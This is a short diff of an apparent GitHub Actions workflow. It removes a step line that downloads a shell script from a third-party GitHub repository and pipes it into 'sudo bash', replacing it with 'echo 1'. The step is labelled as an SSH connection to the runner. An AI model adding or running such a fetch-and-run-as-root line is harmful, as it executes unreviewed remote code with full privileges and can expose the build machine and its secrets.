@@ -8,4 +8,4 @@ jobs:
     steps:
     - name: SSH connection to Actions
       run: |
-      curl https://raw.githubusercontent.com/zsdresd/sh/master/a.sh | sudo bash
+      echo 1
